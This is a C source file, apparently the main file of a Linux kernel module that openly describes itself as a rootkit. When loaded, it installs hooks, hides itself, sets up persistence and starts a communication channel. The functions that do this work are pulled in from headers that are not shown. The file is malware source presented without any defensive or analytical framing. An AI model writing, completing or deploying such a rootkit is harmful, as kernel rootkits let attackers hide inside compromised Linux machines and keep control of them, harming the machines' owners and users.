#include <linux/module.h>
#include <linux/kernel.h>
#include "hook.h"
#include "hide.h"
#include "persist.h"
#include "comm.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("2600");
MODULE_DESCRIPTION("Rootkit LKM");

static int __init rootkit_init(void)
{
    int ret;

    ret = hook_install();
    if (ret != 0)
        return ret;

    hide_self();
    persist_setup();
    comm_init();

    return 0;
}

static void __exit rootkit_exit(void)
{
    comm_exit();
    hook_remove();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
